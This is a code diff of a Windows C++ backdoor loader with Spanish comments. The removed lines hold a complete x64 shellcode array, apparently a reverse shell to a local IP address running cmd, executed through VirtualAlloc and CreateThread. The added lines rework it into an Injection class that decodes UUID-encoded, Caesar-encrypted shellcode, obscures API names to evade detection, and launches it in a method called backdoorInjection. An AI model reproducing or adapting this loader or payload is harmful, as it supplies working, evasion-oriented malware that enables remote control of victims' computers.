@@ -1,45 +1,150 @@
-#include <Windows.h>
+#include "Injection.h"
+#include "Crypt.h"
+#include <iomanip>
 
-void injection()
-{
-	unsigned char shellcode[] =
-		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-		"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
-		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
-		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x5c"
-		"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
-		"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
-		"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
-		"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
-		"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
-		"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
-		"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
-		"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
-		"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
-		"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
-		"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
-		"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
-		"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
-		"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
-		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+Injection::Injection() {
+	this->shellcode = _uuidListToShellcode(this->uuid_shellcode_vector);
+	
+	this->_caesarDecrypt(this->shellcode, this->key);
 
-	PVOID shellcode_exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	RtlCopyMemory(shellcode_exec, shellcode, sizeof(shellcode));
+	std::cout << "Shellcode: ";
+	for (unsigned char byte : shellcode) {
+		std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
+	}
+	std::cout << std::endl;
+}
+
+std::vector<unsigned char> Injection::_hexStringToBytes(const std::string& hex) {
+	std::vector<unsigned char> bytes;
+	for (size_t i = 0; i < hex.length(); i += 2) {
+		unsigned int byte;
+		std::stringstream ss;
+		ss << std::hex << hex.substr(i, 2);
+		ss >> byte;
+		bytes.push_back(static_cast<unsigned char>(byte));
+	}
+	return bytes;
+}
+
+std::vector<unsigned char> Injection::_uuidListToShellcode(const std::vector<std::string>& uuidList) {
+	std::vector<unsigned char> shellcode;
+	for (const auto& uuid : uuidList) {
+		// Eliminar los guiones
+		std::string hexString;
+		for (char c : uuid) {
+			if (c != '-') {
+				hexString += c;
+			}
+		}
+		// Convertir el UUID (sin guiones) en bytes y agregarlos al shellcode
+		std::vector<unsigned char> bytes = _hexStringToBytes(hexString);
+		shellcode.insert(shellcode.end(), bytes.begin(), bytes.end());
+	}
+	return shellcode;
+}
+
+VOID Injection::_caesarDecrypt(std::vector<unsigned char>& data, unsigned char key) {
+	for (auto& byte : data) {
+		byte = (byte - key) % 0x100;  // Descifrado César con clave
+	}
+}
+
+VOID Injection::_caesarEncrypt(std::vector<unsigned char>& data, unsigned char key) {
+	for (auto& byte : data) {
+		byte = (byte + key) % 0x100;  // Descifrado César con clave
+	}
+}
+
+VOID Injection::printShellcode() {
+	std::cout << "Shellcode cifrado con llave 0xDE:" << std::endl;
+	for (size_t i = 0; i < shellcode.size(); ++i) {
+		std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(shellcode[i]) << ", ";
+		if ((i + 1) % 16 == 0) {
+			std::cout << "\n";  // Salto de línea cada 16 bytes para mejor visualización
+		}
+	}
+	std::cout << std::endl;
+}
+
+VOID Injection::_cleanUpResources(HANDLE hThread, PVOID shellcode_exec) {
+	if (hThread) {
+		WaitForSingleObject(hThread, INFINITE);
+	}
+	if (shellcode_exec) {
+		VirtualFree(shellcode_exec, 0, MEM_RELEASE);
+	}
+}
+
+PVOID Injection::_allocateExecutableMemory(SIZE_T size) {
+	PVOID memory = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (memory == NULL) {
+		std::cout << "No se pundo alojar memoria" << std::endl;
+	}
+	return memory;
+}
+
+CreateThreadFunc Injection::_getCreateThreadFunction(void) {
+	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a, };
+	std::vector<unsigned char> createRemote = { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
+
+	std::string kernel32_str = Crypt::decryptCaesar(kernel32, 0xDE);
+	std::string createRemote_str = Crypt::decryptCaesar(createRemote, 0xDE);
+
+
+	// Conversión de vector a string
+	//std::string kernel32_str(kernel32.begin(), kernel32.end());
+	//kernel32_str.push_back('\0');
+
+	HMODULE hModule = GetModuleHandleA(	kernel32_str.c_str());
+	if (hModule == NULL) {
+		std::cout << "No se pudo obtener el dll 32 de nucleo." << std::endl;
+	}
+
+	//std::string createRemote_str(createRemote.begin(), createRemote.end());
+	//createRemote_str.push_back('\0');
+
+	CreateThreadFunc pCreateThread = (CreateThreadFunc)GetProcAddress(hModule, createRemote_str.c_str());
+	if (pCreateThread == NULL) {
+		std::cout << "No se pudo obtener la función cración de hilo." << std::endl;
+	}
+
+	return pCreateThread;
+}
+
+HANDLE Injection::_createShellcodeThread(PVOID shellcode_exec, DWORD& threadID) {
+	CreateThreadFunc pCreateThread = this->_getCreateThreadFunction();
+	if (pCreateThread == nullptr) {
+		return NULL;
+	}
+
+	HANDLE hThread = pCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
+	if (hThread == NULL) {
+		std::cout << "No se pundo crear hilo" << std::endl;
+	}
+
+	return hThread;
+}
+
+VOID Injection::backdoorInjection(void) {
+	SIZE_T shellcodeSize = sizeof(shellcode) - 1;
+
+	// Reserva de memoria para shellcode
+	PVOID shellcode_exec = this->_allocateExecutableMemory(shellcode.size());
+	if (shellcode_exec == NULL) {
+		std::cout << "No se pudo alojar memoria" << std::endl;
+		return;
+	}
+	
+	// Se copia el shellcode en la memoria ejecutable
+	RtlCopyMemory(shellcode_exec, shellcode.data(), shellcode.size());
+	
+	// Se crea el hilo de ejecución del shellcode
 	DWORD threadID;
-	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
-	WaitForSingleObject(hThread, INFINITE);
+	HANDLE hThread = this->_createShellcodeThread(shellcode_exec, threadID);
+	if (hThread == NULL) {
+		VirtualFree(shellcode_exec, 0, MEM_RELEASE);
+		return;
+	}
+	
+	this->_cleanUpResources(hThread, shellcode_exec);
 }
